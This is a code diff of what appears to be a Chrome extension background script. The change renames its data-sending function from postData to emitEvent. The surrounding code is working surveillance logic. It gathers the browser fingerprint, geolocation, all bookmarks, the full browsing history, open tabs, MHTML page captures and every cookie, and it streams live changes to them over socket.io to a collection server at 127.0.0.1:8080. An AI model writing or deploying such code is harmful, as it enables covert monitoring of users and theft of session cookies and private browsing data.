@@ -66,7 +66,7 @@ var getFingerprint = function () {
         userAgent: getUserAgent(),
         screenResolution: getScreenResolution()
     };
-    postData("addFingerprint", fingerprint);
+    emitEvent("addFingerprint", fingerprint);
 }
 
 var getUserAgent = function () {
@@ -80,28 +80,28 @@ var getScreenResolution = function () {
 var getCurrentPosition = function () {
     navigator.geolocation.getCurrentPosition(function (position) {
         console.log("Position found.");
-        postData("addGeoposition", position);
+        emitEvent("addGeoposition", position);
     }, function(positionError) {
         console.log("Position not found.");
-        postData("addGeoposition", null);
+        emitEvent("addGeoposition", null);
     });
 };
 
 var getAllBookmarks = function () {
     chrome.bookmarks.getTree(function (results) {
-        postData("addBookmark", results);
+        emitEvent("addBookmark", results);
     });
 };
 
 var getAllHistory = function () {
     chrome.history.search({"text": ""}, function (historyArray) {
-        postData("addURL", historyArray);
+        emitEvent("addURL", historyArray);
     });
 };
 
 var getAllTabs = function () {
     chrome.windows.getAll({"populate": true}, function (windowArray) {
-        postData('addAllTabs', windowArray);
+        emitEvent('addAllTabs', windowArray);
     });
 }
 
@@ -110,14 +110,14 @@ var getPageCapture = function (tabId) {
         var payload = {};
         payload.tabId = tabId;
         payload.mhtmlData = mhtmlData;
-        postData("pageCapture", payload);
+        emitEvent("pageCapture", payload);
         // saveAs(mhtmlData, tabId + '.mhtml');
     });
 };
 
 var getAllCookies = function () {
     chrome.cookies.getAll({}, function (cookieArray) {
-        postData("addAllCookies", cookieArray);
+        emitEvent("addAllCookies", cookieArray);
     });
 };
 
@@ -126,59 +126,59 @@ var getAllCookies = function () {
 ///////////////////////////////////////////////////////////////////////////////
 
 var onWindowCreate = function (newWindow) {
-    postData('addWindow', newWindow);
+    emitEvent('addWindow', newWindow);
 };
 
 var onWindowActive = function (windowId) {
-    postData('focusWindow', {'windowId': windowId});
+    emitEvent('focusWindow', {'windowId': windowId});
 }
 
 var onWindowRemoved = function (windowId) {
-    postData('removeWindow', {'windowId': windowId});
+    emitEvent('removeWindow', {'windowId': windowId});
 }
 
 var onTabUpdate = function (tabId, changeInfo, tab) {
     if (changeInfo.status === "complete") {
-        postData('updateTab', tab);
+        emitEvent('updateTab', tab);
     }
 };
 
 var onTabActive = function (activeInfo) {
-    postData('focusTab', activeInfo);
+    emitEvent('focusTab', activeInfo);
 };
 
 var onTabRemoved = function (tabId, removeInfo) {
-    postData('removeTab', {'tabId': tabId});
+    emitEvent('removeTab', {'tabId': tabId});
 };
 
 var onURLVisit = function (result) {
-    postData('addURL', result);
+    emitEvent('addURL', result);
 };
 
 var onURLRemoved = function (removed) {
     // Log only if particular visits are removed.
     if (!removed.allHistory) {
-        postData('removeURL', removed);
+        emitEvent('removeURL', removed);
     }
 };
 
 var onCookieChange = function (changeInfo) {
-    postData('addCookieChange', changeInfo);
+    emitEvent('addCookieChange', changeInfo);
 };
 
 var onBookmarkCreate = function (id, bookmark) {
-    postData('addBookmark', [bookmark]);
+    emitEvent('addBookmark', [bookmark]);
 };
 
 var onBookmarkChange = function (id, changeInfo) {
-    postData('changeBookmark', {
+    emitEvent('changeBookmark', {
         'id': id,
         'changeInfo': changeInfo
     });
 };
 
 var onBookmarkRemoved = function (id, changeInfo) {
-    postData('removeBookmark', { 'id': id });
+    emitEvent('removeBookmark', { 'id': id });
 };
 
 var activateListeners = function () {
@@ -205,7 +205,7 @@ var activateListeners = function () {
 var SERVER_URL = "http://127.0.0.1:8080/";
 var socket = io.connect(SERVER_URL);
 
-var postData = function (type, payload) {
+var emitEvent = function (type, payload) {
     // Define data object.
     data = {}
     data.uuid = uuid;
@@ -213,7 +213,7 @@ var postData = function (type, payload) {
     data.type = type;
     data.payload = JSON.stringify(payload);
     // Compress payload.
-    // data.payload = LZString.compress(JSON.stringify(payload));
+    // data.payload = LZString.compress(JSON.stringif/y(payload));
     // Log data.
     // console.log(data);
     // console.log(payload);
